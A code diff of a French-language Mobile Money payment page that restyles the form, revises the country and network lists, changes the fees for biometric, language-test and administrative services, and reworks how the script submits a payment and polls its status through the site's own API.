@@ -2,10 +2,15 @@
 <html lang="fr">
 
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Service de paiement</title>
+<meta charset="UTF-8">
+
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1.0"
+>
+
+<title>Paiement Mobile Money</title>
 
 <style>
 
@@ -14,152 +19,191 @@
 }
 
 body {
-  font-family: Arial, sans-serif;
+
+  margin: 0;
+
+  min-height: 100vh;
+
+  font-family:
+    Arial,
+    Helvetica,
+    sans-serif;
 
   background:
     linear-gradient(
-      rgba(0,0,0,0.60),
-      rgba(0,0,0,0.60)
+      rgba(0,0,0,0.35),
+      rgba(0,0,0,0.35)
     ),
-    url("background.jpg") no-repeat center center;
-
-  background-size: cover;
+    url("background.jpg")
+    center center / cover
+    fixed no-repeat;
 
   display: flex;
+
   justify-content: center;
+
   align-items: center;
 
-  min-height: 100vh;
-  margin: 0;
   padding: 20px;
 }
 
 .box {
-  background: white;
-
-  padding: 25px;
-
-  border-radius: 12px;
 
   width: 100%;
-  max-width: 400px;
 
-  text-align: center;
+  max-width: 520px;
+
+  background: #ffffff;
+
+  border-radius: 18px;
+
+  padding: 30px;
 
   box-shadow:
-    0 8px 30px rgba(0,0,0,0.25);
+    0 15px 50px
+    rgba(0,0,0,0.25);
 }
 
 .logo {
-  width: 100px;
-  max-width: 100%;
 
-  margin-bottom: 10px;
+  display: block;
+
+  width: 170px;
+
+  max-width: 80%;
+
+  margin:
+    0 auto 20px auto;
 }
 
-.title {
+h1 {
+
+  text-align: center;
+
+  margin:
+    0 0 25px 0;
+
+  color: #222;
+
+  font-size: 25px;
+}
+
+label {
+
+  display: block;
+
+  margin-top: 15px;
+
+  margin-bottom: 7px;
+
   font-weight: bold;
-  font-size: 20px;
 
-  margin-bottom: 8px;
+  color: #333;
 }
 
-.subtitle {
-  font-size: 13px;
-
-  color: #666;
-
-  margin-bottom: 15px;
-}
-
-input,
-select {
+select,
+input {
 
   width: 100%;
 
-  padding: 12px;
-
-  margin-top: 10px;
-
-  border-radius: 6px;
+  height: 48px;
 
   border: 1px solid #ccc;
 
-  font-size: 15px;
+  border-radius: 10px;
 
-  background: white;
-}
+  padding: 0 13px;
 
-input:focus,
-select:focus {
+  font-size: 16px;
+
+  background: #fff;
 
   outline: none;
-
-  border-color: #00bcd4;
 }
 
-.row {
+select:focus,
+input:focus {
+
+  border-color: #1687ff;
+
+  box-shadow:
+    0 0 0 2px
+    rgba(22,135,255,0.12);
+}
+
+.phone-row {
 
   display: flex;
 
-  gap: 6px;
+  gap: 8px;
 }
 
 .prefix {
 
-  width: 32%;
+  width: 90px;
 
-  background: #eee;
+  flex-shrink: 0;
+
+  background: #f4f4f4;
 
   text-align: center;
+
+  font-weight: bold;
 }
 
 .phone {
 
-  width: 68%;
+  flex: 1;
 }
 
-.amount-box {
+.amount {
 
-  margin-top: 15px;
+  margin-top: 20px;
 
-  padding: 12px;
+  padding: 17px;
 
-  border-radius: 6px;
+  border-radius: 12px;
 
-  background: #f4f4f4;
+  background: #f4f8fb;
+
+  text-align: center;
+
+  font-size: 19px;
 
   font-weight: bold;
 
-  font-size: 16px;
+  color: #1476c8;
 }
 
 button {
 
   width: 100%;
 
-  padding: 14px;
+  height: 52px;
 
-  margin-top: 15px;
+  margin-top: 20px;
 
-  background: #00bcd4;
+  border: 0;
+
+  border-radius: 11px;
+
+  background: #087fce;
 
   color: white;
 
-  border: none;
-
-  border-radius: 6px;
+  font-size: 17px;
 
   font-weight: bold;
 
-  font-size: 16px;
-
   cursor: pointer;
+
+  transition:
+    0.2s;
 }
 
 button:hover {
 
-  opacity: 0.9;
+  background: #066aa9;
 }
 
 button:disabled {
@@ -171,80 +215,101 @@ button:disabled {
 
 #result {
 
-  margin-top: 15px;
+  min-height: 55px;
 
-  font-weight: bold;
+  margin-top: 20px;
 
-  font-size: 14px;
+  text-align: center;
 
   line-height: 1.5;
 
-  min-height: 22px;
+  font-size: 15px;
 }
 
 .status-box {
 
-  margin-top: 12px;
-
-  padding: 12px;
-
-  border-radius: 8px;
-
-  background: #f5f5f5;
-
-  font-size: 13px;
-
-  line-height: 1.5;
-
   display: none;
-}
 
-.reference {
+  margin-top: 15px;
 
-  font-size: 11px;
+  padding: 15px;
 
-  color: #777;
-
-  word-break: break-all;
-
-  margin-top: 6px;
-}
-
-.notice {
-
-  margin-top: 12px;
-
-  font-size: 11px;
-
-  color: #777;
-
-  line-height: 1.4;
-}
-
-.footer {
-
-  position: fixed;
-
-  bottom: 8px;
-
-  width: 100%;
+  border-radius: 10px;
 
   text-align: center;
 
+  font-weight: bold;
+}
+
+.status-pending {
+
+  display: block;
+
+  background: #fff8df;
+
+  color: #8a6800;
+}
+
+.status-success {
+
+  display: block;
+
+  background: #e7f8ed;
+
+  color: #15733a;
+}
+
+.status-failed {
+
+  display: block;
+
+  background: #fdeaea;
+
+  color: #b02020;
+}
+
+.payment-link {
+
+  display: none;
+
+  margin-top: 15px;
+
+  text-align: center;
+}
+
+.payment-link a {
+
+  display: inline-block;
+
+  padding: 12px 18px;
+
+  border-radius: 8px;
+
+  background: #ff7900;
+
   color: white;
 
-  font-size: 11px;
+  text-decoration: none;
 
-  padding: 0 10px;
+  font-weight: bold;
+}
+
+.small {
+
+  margin-top: 12px;
+
+  text-align: center;
+
+  color: #777;
+
+  font-size: 12px;
 }
 
 </style>
 
 </head>
 
-
 <body>
-
 
 <div class="box">
 
@@ -254,41 +319,42 @@ button:disabled {
     alt="Logo"
   >
 
-
-  <div class="title">
-    Service de paiement
-  </div>
-
-
-  <div class="subtitle">
-    Sélectionnez le service et votre moyen de paiement.
-  </div>
-
+  <h1>
+    Paiement Mobile Money
+  </h1>
 
   <!-- SERVICE -->
+
+  <label for="service">
+    Service
+  </label>
 
   <select id="service">
 
     <option value="biometrie">
-      Données biométriques - 2 USD
+      Données biométriques — 1 USD
     </option>
 
     <option value="langue">
-      Test de langue - 2 USD
+      Test de langue — 150 USD
     </option>
 
     <option value="administratif">
-      Droit administratif - 2 USD
+      Frais administratifs — 220 USD
     </option>
 
     <option value="total">
-      Tout payer - 2 USD
+      Paiement total — 520 USD
     </option>
 
   </select>
 
 
   <!-- PAYS -->
+
+  <label for="country">
+    Pays
+  </label>
 
   <select id="country">
 
@@ -300,52 +366,59 @@ button:disabled {
       Côte d'Ivoire
     </option>
 
+    <option value="BF">
+      Burkina Faso
+    </option>
+
+    <option value="COG">
+      Congo-Brazzaville
+    </option>
+
     <option value="SEN">
       Sénégal
     </option>
 
-    <option value="CMR">
-      Cameroun
+    <option value="TGO">
+      Togo
     </option>
 
-    <option value="GAB">
-      Gabon
-    </option>
-
-    <option value="COG">
-      Congo
-    </option>
-
-    <option value="COD">
-      RDC
+    <option value="MLI">
+      Mali
     </option>
 
   </select>
 
 
-  <!-- OPERATEUR -->
+  <!-- RESEAU -->
 
-  <select id="operator">
-  </select>
+  <label for="operator">
+    Réseau Mobile Money
+  </label>
+
+  <select id="operator"></select>
 
 
   <!-- TELEPHONE -->
 
-  <div class="row">
+  <label for="phone">
+    Numéro Mobile Money
+  </label>
+
+  <div class="phone-row">
 
     <input
+      type="text"
       id="prefix"
       class="prefix"
       readonly
     >
 
     <input
+      type="tel"
       id="phone"
       class="phone"
-      type="tel"
-      inputmode="numeric"
-      placeholder="Numéro de téléphone"
-      maxlength="15"
+      placeholder="Exemple : 771740000"
+      autocomplete="tel"
     >
 
   </div>
@@ -354,8 +427,8 @@ button:disabled {
   <!-- MONTANT -->
 
   <div
-    class="amount-box"
     id="displayAmount"
+    class="amount"
   >
     Montant à payer
   </div>
@@ -381,371 +454,341 @@ button:disabled {
   <div
     id="statusBox"
     class="status-box"
+  ></div>
+
+
+  <!-- LIEN PAYMENT URL -->
+
+  <div
+    id="paymentLink"
+    class="payment-link"
   >
 
-    <div id="statusText"></div>
-
-    <div
-      id="referenceText"
-      class="reference"
-    ></div>
-
-  </div>
-
-
-  <div class="notice">
-
-    Le paiement est traité de manière sécurisée.
-    Vérifiez attentivement votre numéro avant de confirmer.
+    <a
+      id="paymentLinkButton"
+      href="#"
+      target="_blank"
+      rel="noopener"
+    >
+      Ouvrir le paiement
+    </a>
 
   </div>
 
-</div>
 
-
-<div class="footer">
-
-  © 2026 — Service de paiement sécurisé
+  <div class="small">
+    Le paiement est sécurisé par FeexPay.
+  </div>
 
 </div>
-
 
 
 <script>
 
+/* =========================================================
+   ELEMENTS
+========================================================= */
 
-/* =====================================================
-   SERVICES
-===================================================== */
+const service =
+  document.getElementById(
+    "service"
+  );
 
-const services = {
+const country =
+  document.getElementById(
+    "country"
+  );
 
-  biometrie: {
-    name: "Données biométriques",
-    usd: 2
-  },
+const operator =
+  document.getElementById(
+    "operator"
+  );
 
-  langue: {
-    name: "Test de langue",
-    usd: 2
-  },
+const prefix =
+  document.getElementById(
+    "prefix"
+  );
 
-  administratif: {
-    name: "Droit administratif",
-    usd: 2
-  },
+const phone =
+  document.getElementById(
+    "phone"
+  );
 
-  total: {
-    name: "Tout payer",
-    usd: 2
-  }
+const displayAmount =
+  document.getElementById(
+    "displayAmount"
+  );
 
-};
+const payButton =
+  document.getElementById(
+    "payButton"
+  );
+
+const result =
+  document.getElementById(
+    "result"
+  );
+
+const statusBox =
+  document.getElementById(
+    "statusBox"
+  );
+
+const paymentLink =
+  document.getElementById(
+    "paymentLink"
+  );
+
+const paymentLinkButton =
+  document.getElementById(
+    "paymentLinkButton"
+  );
 
 
-
-/* =====================================================
-   PAYS
-===================================================== */
+/* =========================================================
+   CONFIGURATION
+========================================================= */
 
 const countries = {
 
   BEN: {
 
+    name: "Bénin",
+
     prefix: "229",
+
+    currency: "XOF",
+
+    rate: 550,
 
     networks: [
 
       {
         value: "mtn",
-        label: "MTN BENIN"
+        label: "MTN Bénin"
       },
 
       {
         value: "moov",
-        label: "MOOV BENIN"
+        label: "Moov Bénin"
       },
 
       {
         value: "celtiis",
-        label: "CELTIIS BENIN"
+        label: "Celtiis Bénin"
       }
 
     ]
-
   },
 
 
   CIV: {
 
+    name: "Côte d'Ivoire",
+
     prefix: "225",
+
+    currency: "XOF",
+
+    rate: 550,
 
     networks: [
 
       {
         value: "mtn",
-        label: "MTN CI"
-      },
-
-      {
-        value: "orange",
-        label: "ORANGE CI"
+        label: "MTN Côte d'Ivoire"
       },
 
       {
         value: "moov",
-        label: "MOOV CI"
-      },
-
-      {
-        value: "wave",
-        label: "WAVE CI"
-      }
-
-    ]
-
-  },
-
-
-  SEN: {
-
-    prefix: "221",
-
-    networks: [
-
-      {
-        value: "orange",
-        label: "ORANGE SENEGAL"
-      },
-
-      {
-        value: "wave",
-        label: "WAVE SENEGAL"
-      },
-
-      {
-        value: "free",
-        label: "FREE SENEGAL"
-      }
-
-    ]
-
-  },
-
-
-  CMR: {
-
-    prefix: "237",
-
-    networks: [
-
-      {
-        value: "mtn",
-        label: "MTN CAMEROUN"
+        label: "Moov Côte d'Ivoire"
       },
 
       {
         value: "orange",
-        label: "ORANGE CAMEROUN"
+        label: "Orange Côte d'Ivoire"
+      },
+
+      {
+        value: "wave",
+        label: "Wave Côte d'Ivoire"
       }
 
     ]
-
   },
 
 
-  GAB: {
+  BF: {
 
-    prefix: "241",
+    name: "Burkina Faso",
+
+    prefix: "226",
+
+    currency: "XOF",
+
+    rate: 550,
 
     networks: [
 
       {
-        value: "airtel",
-        label: "AIRTEL GABON"
+        value: "moov",
+        label: "Moov Burkina Faso"
+      },
+
+      {
+        value: "orange",
+        label: "Orange Burkina Faso"
       }
 
     ]
-
   },
 
 
   COG: {
 
+    name: "Congo-Brazzaville",
+
     prefix: "242",
+
+    currency: "XAF",
+
+    rate: 550,
 
     networks: [
 
       {
         value: "mtn",
-        label: "MTN CONGO"
+        label: "MTN Congo"
       }
 
     ]
-
   },
 
 
-  COD: {
+  SEN: {
 
-    prefix: "243",
+    name: "Sénégal",
+
+    prefix: "221",
+
+    currency: "XOF",
+
+    rate: 550,
 
     networks: [
 
       {
-        value: "vodacom",
-        label: "VODACOM RDC"
-      },
-
-      {
         value: "orange",
-        label: "ORANGE RDC"
+        label: "Orange Sénégal"
       },
 
       {
-        value: "airtel",
-        label: "AIRTEL RDC"
+        value: "wave",
+        label: "Wave Sénégal"
+      },
+
+      {
+        value: "free",
+        label: "Free Sénégal"
       }
 
     ]
+  },
 
+
+  TGO: {
+
+    name: "Togo",
+
+    prefix: "228",
+
+    currency: "XOF",
+
+    rate: 550,
+
+    networks: [
+
+      {
+        value: "togocom",
+        label: "Togocom"
+      },
+
+      {
+        value: "moov",
+        label: "Moov Togo"
+      }
+
+    ]
+  },
+
+
+  MLI: {
+
+    name: "Mali",
+
+    prefix: "223",
+
+    currency: "XOF",
+
+    rate: 550,
+
+    networks: [
+
+      {
+        value: "orange",
+        label: "Orange Mali"
+      },
+
+      {
+        value: "moov",
+        label: "Moov Mali"
+      }
+
+    ]
   }
 
 };
 
 
+/* =========================================================
+   SERVICES
+========================================================= */
 
-/* =====================================================
-   TAUX
-===================================================== */
+const services = {
 
-const rates = {
+  biometrie: 1,
 
-  XOF: 550,
+  langue: 150,
 
-  XAF: 550,
+  administratif: 220,
 
-  CDF: 2800
+  total: 520
 
 };
 
 
-
-/* =====================================================
-   ELEMENTS
-===================================================== */
-
-const service =
-  document.getElementById("service");
-
-const country =
-  document.getElementById("country");
-
-const operator =
-  document.getElementById("operator");
-
-const prefix =
-  document.getElementById("prefix");
-
-const phone =
-  document.getElementById("phone");
-
-const displayAmount =
-  document.getElementById("displayAmount");
-
-const result =
-  document.getElementById("result");
-
-const payButton =
-  document.getElementById("payButton");
-
-const statusBox =
-  document.getElementById("statusBox");
-
-const statusText =
-  document.getElementById("statusText");
-
-const referenceText =
-  document.getElementById("referenceText");
-
-
-
-/* =====================================================
+/* =========================================================
    VARIABLES
-===================================================== */
+========================================================= */
 
-let finalAmount = 0;
+let paymentInProgress =
+  false;
 
-let paymentInProgress = false;
-
-let statusTimer = null;
-
-let statusAttempts = 0;
-
-const MAX_STATUS_ATTEMPTS = 20;
+let statusTimer =
+  null;
 
 
-
-/* =====================================================
-   DEVISE
-===================================================== */
-
-function getCurrency(countryCode) {
-
-  if (
-
-    countryCode === "BEN" ||
-
-    countryCode === "CIV" ||
-
-    countryCode === "SEN"
-
-  ) {
-
-    return "XOF";
-
-  }
-
-
-  if (
-
-    countryCode === "CMR" ||
-
-    countryCode === "GAB" ||
-
-    countryCode === "COG"
-
-  ) {
-
-    return "XAF";
-
-  }
-
-
-  if (countryCode === "COD") {
-
-    return "CDF";
-
-  }
-
-
-  return "XOF";
-
-}
-
-
-
-/* =====================================================
+/* =========================================================
    CHANGEMENT DE PAYS
-===================================================== */
+========================================================= */
 
 function updateCountry() {
 
-  const selectedCountry =
+  const selected =
     country.value;
 
   const data =
-    countries[selectedCountry];
+    countries[selected];
 
   operator.innerHTML = "";
 
@@ -754,491 +797,376 @@ function updateCountry() {
     prefix.value = "";
 
     return;
-
   }
-
 
   prefix.value =
     "+" + data.prefix;
 
+  data.networks.forEach(
+    function(net) {
 
-  data.networks.forEach(function(net) {
+      const option =
+        document.createElement(
+          "option"
+        );
 
-    const option =
-      document.createElement("option");
+      option.value =
+        net.value;
 
-    option.value =
-      net.value;
+      option.textContent =
+        net.label;
 
-    option.textContent =
-      net.label;
+      operator.appendChild(
+        option
+      );
+    }
+  );
 
-    operator.appendChild(option);
-
-  });
-
+  updateAmount();
 }
 
 
-
-/* =====================================================
-   MONTANT
-===================================================== */
+/* =========================================================
+   CALCUL MONTANT
+========================================================= */
 
 function updateAmount() {
 
   const selectedService =
     service.value;
 
-  const serviceData =
-    services[selectedService];
+  const usd =
+    services[
+      selectedService
+    ];
 
-  if (!serviceData) {
+  const data =
+    countries[
+      country.value
+    ];
 
+  if (!usd || !data) {
     return;
-
   }
 
-
-  const currency =
-    getCurrency(country.value);
-
-  const rate =
-    rates[currency] || 550;
-
-
-  finalAmount =
+  const amount =
     Math.round(
-      serviceData.usd * rate
+      usd * data.rate
     );
-
 
   displayAmount.textContent =
     "Montant à payer : " +
-
-    finalAmount.toLocaleString("fr-FR") +
-
+    amount.toLocaleString(
+      "fr-FR"
+    ) +
     " " +
-
-    currency;
-
+    data.currency;
 }
 
 
-
-/* =====================================================
+/* =========================================================
    TELEPHONE
-===================================================== */
+========================================================= */
 
 function getPhoneNumber() {
 
   let number =
     phone.value
-
       .trim()
-
       .replace(/\s+/g, "")
-
+      .replace(/-/g, "")
       .replace(/^\+/, "");
 
-
   if (!number) {
-
     return null;
-
   }
 
+  const data =
+    countries[
+      country.value
+    ];
 
-  const countryCode =
-    country.value;
-
-  const countryData =
-    countries[countryCode];
-
-
-  if (!countryData) {
-
+  if (!data) {
     return null;
-
   }
-
 
   const prefixNumber =
-    countryData.prefix;
-
+    data.prefix;
 
   /*
-   * Si le numéro contient déjà
-   * le préfixe international,
-   * on ne le double pas.
+   * Si le client a déjà mis
+   * l'indicatif international.
    */
 
   if (
-    number.startsWith(prefixNumber)
+    number.startsWith(
+      prefixNumber
+    )
   ) {
 
     number =
       number.substring(
         prefixNumber.length
       );
-
   }
-
 
   /*
-   * Vérification numérique
+   * Retirer un éventuel zéro
+   * national au début.
    */
 
-  if (!/^[0-9]+$/.test(number)) {
+  if (
+    number.startsWith("0")
+  ) {
 
-    return null;
-
+    number =
+      number.substring(1);
   }
 
-
-  if (number.length < 6) {
+  if (
+    !/^\d+$/.test(number)
+  ) {
 
     return null;
-
   }
 
+  if (
+    number.length < 8 ||
+    number.length > 10
+  ) {
 
-  return prefixNumber + number;
+    return null;
+  }
 
+  return (
+    prefixNumber +
+    number
+  );
 }
 
 
+/* =========================================================
+   RESET AFFICHAGE
+========================================================= */
 
-/* =====================================================
-   AFFICHAGE STATUT
-===================================================== */
-
-function showStatusBox() {
-
-  statusBox.style.display =
-    "block";
-
-}
-
-
-function hideStatusBox() {
-
-  statusBox.style.display =
-    "none";
-
-  statusText.textContent =
-    "";
-
-  referenceText.textContent =
-    "";
-
-}
-
-
-
-/* =====================================================
-   ARRET DU TIMER
-===================================================== */
-
-function stopStatusChecking() {
+function resetStatus() {
 
   if (statusTimer) {
 
-    clearInterval(statusTimer);
+    clearInterval(
+      statusTimer
+    );
 
-    statusTimer = null;
-
+    statusTimer =
+      null;
   }
 
+  statusBox.className =
+    "status-box";
+
+  statusBox.textContent =
+    "";
+
+  paymentLink.style.display =
+    "none";
 }
 
 
+/* =========================================================
+   AFFICHAGE STATUT
+========================================================= */
 
-/* =====================================================
+function showStatus(
+  status,
+  message
+) {
+
+  const value =
+    String(
+      status || ""
+    ).toUpperCase();
+
+  statusBox.className =
+    "status-box";
+
+  if (
+    value ===
+      "SUCCESSFUL" ||
+    value ===
+      "SUCCESS"
+  ) {
+
+    statusBox.classList.add(
+      "status-success"
+    );
+
+    statusBox.textContent =
+      "✓ Paiement confirmé.";
+
+    result.style.color =
+      "green";
+
+    result.textContent =
+      "Votre paiement a été confirmé avec succès.";
+
+    return "SUCCESS";
+
+  }
+
+
+  if (
+    value === "FAILED" ||
+    value === "FAILURE" ||
+    value === "CANCELLED"
+  ) {
+
+    statusBox.classList.add(
+      "status-failed"
+    );
+
+    statusBox.textContent =
+      "✕ Paiement échoué ou annulé.";
+
+    result.style.color =
+      "red";
+
+    result.textContent =
+      message ||
+      "Le paiement n'a pas été confirmé.";
+
+    return "FAILED";
+
+  }
+
+
+  statusBox.classList.add(
+    "status-pending"
+  );
+
+  statusBox.textContent =
+    "⏳ Paiement en attente de confirmation...";
+
+  result.style.color =
+    "#8a6800";
+
+  result.textContent =
+    "Veuillez confirmer le paiement sur votre téléphone.";
+
+  return "PENDING";
+}
+
+
+/* =========================================================
    VERIFICATION DU STATUT
-===================================================== */
+========================================================= */
 
-async function checkPaymentStatus(reference) {
+async function checkPaymentStatus(
+  reference
+) {
+
+  if (!reference) {
+    return;
+  }
 
   try {
 
     const response =
       await fetch(
         "/api/payment-status/" +
-        encodeURIComponent(reference)
+        encodeURIComponent(
+          reference
+        )
       );
-
 
     const data =
       await response.json();
 
-
-    console.log(
-      "Statut paiement :",
-      data
-    );
-
-
     if (!response.ok) {
 
-      throw new Error(
-
-        data.error ||
-
-        data.message ||
-
-        "Impossible de vérifier le paiement."
-
+      console.error(
+        "Erreur statut :",
+        data
       );
 
+      return;
     }
 
-
-    const status =
-      String(
-        data.status || "PENDING"
-      ).toUpperCase();
-
+    const finalStatus =
+      showStatus(
+        data.status,
+        data.message
+      );
 
     /*
-     * PAIEMENT REUSSI
+     * Paiement terminé :
+     * on arrête le polling.
      */
 
-    if (status === "SUCCESSFUL") {
+    if (
+      finalStatus ===
+        "SUCCESS" ||
+      finalStatus ===
+        "FAILED"
+    ) {
 
-      stopStatusChecking();
+      if (statusTimer) {
 
-      paymentInProgress =
-        false;
+        clearInterval(
+          statusTimer
+        );
+
+        statusTimer =
+          null;
+      }
 
       payButton.disabled =
         false;
 
       payButton.textContent =
         "Payer maintenant";
-
-
-      result.style.color =
-        "green";
-
-
-      result.textContent =
-        "✓ Paiement confirmé avec succès.";
-
-
-      showStatusBox();
-
-
-      statusText.style.color =
-        "green";
-
-
-      statusText.innerHTML =
-        "✓ <strong>Paiement confirmé</strong><br>" +
-
-        "Votre paiement a été accepté.";
-
-      
-      referenceText.textContent =
-        "Référence : " +
-        reference;
-
-
-      return;
-
     }
 
-
-
-    /*
-     * PAIEMENT ECHOUE / ANNULE
-     */
-
-    if (status === "FAILED") {
-
-      stopStatusChecking();
-
-      paymentInProgress =
-        false;
-
-      payButton.disabled =
-        false;
-
-      payButton.textContent =
-        "Payer maintenant";
-
-
-      result.style.color =
-        "red";
-
-
-      result.textContent =
-        "✗ Le paiement n'a pas abouti.";
-
-
-      showStatusBox();
-
-
-      statusText.style.color =
-        "red";
-
-
-      const reason =
-        data.reason ||
-        data.message ||
-        "Paiement refusé ou annulé.";
-
-
-      statusText.innerHTML =
-        "✗ <strong>Paiement échoué</strong><br>" +
-
-        reason;
-
-
-      referenceText.textContent =
-        "Référence : " +
-        reference;
-
-
-      return;
-
-    }
-
-
-
-    /*
-     * PAIEMENT EN ATTENTE
-     */
-
-    result.style.color =
-      "orange";
-
-
-    result.textContent =
-      "⏳ Paiement en attente. " +
-
-      "Vérifiez votre téléphone.";
-
-
-    showStatusBox();
-
-
-    statusText.style.color =
-      "orange";
-
-
-    statusText.innerHTML =
-      "⏳ <strong>Paiement en attente</strong><br>" +
-
-      "Veuillez confirmer le paiement sur votre téléphone.";
-
-
-    referenceText.textContent =
-      "Référence : " +
-      reference;
-
-
-  }
-
-  catch (error) {
+  } catch (error) {
 
     console.error(
       "Erreur vérification statut :",
       error
     );
-
-    /*
-     * On ne considère PAS automatiquement
-     * le paiement comme échoué simplement
-     * parce que la vérification rencontre
-     * une erreur réseau.
-     */
-
   }
-
 }
 
 
+/* =========================================================
+   DEMARRER LE SUIVI
+========================================================= */
 
-/* =====================================================
-   DEMARRAGE VERIFICATION
-===================================================== */
+function startStatusPolling(
+  reference
+) {
 
-function startStatusChecking(reference) {
-
-  stopStatusChecking();
-
-  statusAttempts = 0;
-
+  if (!reference) {
+    return;
+  }
 
   /*
-   * Première vérification après 3 secondes
+   * Première vérification immédiate.
+   */
+
+  checkPaymentStatus(
+    reference
+  );
+
+  /*
+   * Puis toutes les 3 secondes.
    */
 
   statusTimer =
     setInterval(
-      async function() {
+      function() {
 
-        statusAttempts++;
-
-
-        if (
-          statusAttempts >
-          MAX_STATUS_ATTEMPTS
-        ) {
-
-          stopStatusChecking();
-
-
-          paymentInProgress =
-            false;
-
-          payButton.disabled =
-            false;
-
-          payButton.textContent =
-            "Payer maintenant";
-
-
-          result.style.color =
-            "orange";
-
-
-          result.textContent =
-            "⏳ Le paiement est toujours en attente. " +
-
-            "Vous pouvez vérifier votre téléphone.";
-
-          
-          showStatusBox();
-
-
-          statusText.style.color =
-            "orange";
-
-
-          statusText.innerHTML =
-            "Le statut n'a pas encore été confirmé. " +
-
-            "Si vous avez effectué le paiement, " +
-
-            "attendez quelques instants puis réessayez.";
-
-          
-          referenceText.textContent =
-            "Référence : " +
-            reference;
-
-
-          return;
-
-        }
-
-
-        await checkPaymentStatus(
+        checkPaymentStatus(
           reference
         );
-
 
       },
       3000
@@ -1247,23 +1175,22 @@ function startStatusChecking(reference) {
 }
 
 
-
-/* =====================================================
+/* =========================================================
    PAIEMENT
-===================================================== */
+========================================================= */
 
 async function payer() {
 
-  if (paymentInProgress) {
-
+  if (
+    paymentInProgress
+  ) {
     return;
-
   }
 
+  resetStatus();
 
   const phoneNumber =
     getPhoneNumber();
-
 
   if (!phoneNumber) {
 
@@ -1274,9 +1201,7 @@ async function payer() {
       "Veuillez entrer un numéro de téléphone valide.";
 
     return;
-
   }
-
 
   const selectedCountry =
     country.value;
@@ -1287,21 +1212,22 @@ async function payer() {
   const selectedService =
     service.value;
 
-
   if (!selectedOperator) {
 
     result.style.color =
       "red";
 
     result.textContent =
-      "Veuillez sélectionner votre opérateur.";
+      "Veuillez sélectionner votre réseau.";
 
     return;
-
   }
 
-
-  if (!services[selectedService]) {
+  if (
+    !services[
+      selectedService
+    ]
+  ) {
 
     result.style.color =
       "red";
@@ -1310,50 +1236,24 @@ async function payer() {
       "Service de paiement invalide.";
 
     return;
-
   }
-
-
-  /*
-   * Nouvelle tentative :
-   * on arrête une éventuelle ancienne
-   * vérification.
-   */
-
-  stopStatusChecking();
-
-  hideStatusBox();
-
 
   paymentInProgress =
     true;
 
-
   payButton.disabled =
     true;
-
 
   payButton.textContent =
     "Traitement en cours...";
 
-
   result.style.color =
     "#333";
-
 
   result.textContent =
     "Connexion au serveur de paiement...";
 
-
   try {
-
-
-    /*
-     * Envoi au serveur.
-     *
-     * IMPORTANT :
-     * La clé FeexPay reste sur le serveur.
-     */
 
     const response =
       await fetch(
@@ -1363,172 +1263,140 @@ async function payer() {
           method: "POST",
 
           headers: {
-
             "Content-Type":
               "application/json"
-
           },
 
-          body: JSON.stringify({
+          body:
+            JSON.stringify({
 
-            phone:
-              phoneNumber,
+              phone:
+                phoneNumber,
 
-            service:
-              selectedService,
+              service:
+                selectedService,
 
-            country:
-              selectedCountry,
+              country:
+                selectedCountry,
 
-            operator:
-              selectedOperator
-
-          })
-
+              operator:
+                selectedOperator
+            })
         }
       );
-
 
     const data =
       await response.json();
 
-
-    console.log(
-      "Réponse paiement :",
-      data
-    );
-
-
     if (!response.ok) {
 
       throw new Error(
-
         data.error ||
-
         data.message ||
-
         "Le serveur a refusé la demande."
-
       );
+    }
+
+    /*
+     * FeexPay peut retourner
+     * un payment_url pour certains réseaux.
+     */
+
+    if (
+      data.payment_url
+    ) {
+
+      paymentLink.style.display =
+        "block";
+
+      paymentLinkButton.href =
+        data.payment_url;
+    }
+
+    /*
+     * Demande acceptée.
+     */
+
+    if (
+      data.status ===
+        "PENDING" ||
+      data.status ===
+        "ACCEPTED"
+    ) {
+
+      result.style.color =
+        "#8a6800";
+
+      result.textContent =
+        "Demande de paiement envoyée. Vérifiez votre téléphone et confirmez le paiement.";
+
+      showStatus(
+        "PENDING",
+        data.message
+      );
+
+      /*
+       * Commencer la confirmation
+       * automatique.
+       */
+
+      if (
+        data.reference
+      ) {
+
+        startStatusPolling(
+          data.reference
+        );
+      }
 
     }
 
+    else if (
+      data.status ===
+        "SUCCESSFUL" ||
+      data.status ===
+        "SUCCESS"
+    ) {
 
-    /*
-     * Le serveur doit retourner
-     * la référence FeexPay.
-     */
-
-    const reference =
-      data.reference;
-
-
-    if (!reference) {
-
-      throw new Error(
-
-        "La référence de paiement n'a pas été reçue."
-
+      showStatus(
+        data.status,
+        data.message
       );
-
     }
 
+    else {
 
-    /*
-     * DEMANDE ACCEPTEE
-     */
+      showStatus(
+        data.status,
+        data.message
+      );
+    }
 
-    result.style.color =
-      "green";
-
-
-    result.textContent =
-      "✓ Demande de paiement envoyée. " +
-
-      "Vérifiez votre téléphone et confirmez " +
-
-      "le paiement avec votre code PIN.";
-
-
-    showStatusBox();
-
-
-    statusText.style.color =
-      "orange";
-
-
-    statusText.innerHTML =
-      "⏳ <strong>En attente de confirmation</strong><br>" +
-
-      "Une demande de paiement a été envoyée sur votre téléphone.";
-
-
-    referenceText.textContent =
-      "Référence : " +
-      reference;
-
-
-    /*
-     * IMPORTANT :
-     * On ne libère PAS le bouton ici.
-     *
-     * Le paiement est encore PENDING.
-     *
-     * On démarre donc la vérification
-     * automatique auprès du serveur.
-     */
-
-    payButton.textContent =
-      "Vérification du paiement...";
-
-
-    startStatusChecking(
-      reference
-    );
-
-
-  }
-
-  catch (error) {
+  } catch (error) {
 
     console.error(
       "Erreur paiement :",
       error
     );
 
-
-    stopStatusChecking();
-
-
-    paymentInProgress =
-      false;
-
-
-    payButton.disabled =
-      false;
-
-
-    payButton.textContent =
-      "Payer maintenant";
-
-
     result.style.color =
       "red";
-
 
     result.textContent =
       "❌ " +
       error.message;
+
+    payButton.disabled =
+      false;
 
   }
 
 }
 
 
-
-/* =====================================================
+/* =========================================================
    EVENEMENTS
-===================================================== */
+========================================================= */
 
 country.addEventListener(
   "change",
@@ -1536,15 +1404,17 @@ country.addEventListener(
 
     updateCountry();
 
-    updateAmount();
-
   }
 );
 
 
 service.addEventListener(
   "change",
-  updateAmount
+  function() {
+
+    updateAmount();
+
+  }
 );
 
 
@@ -1554,17 +1424,13 @@ payButton.addEventListener(
 );
 
 
-
-/* =====================================================
+/* =========================================================
    INITIALISATION
-===================================================== */
+========================================================= */
 
 updateCountry();
 
 updateAmount();
-
-hideStatusBox();
-
 
 </script>
 
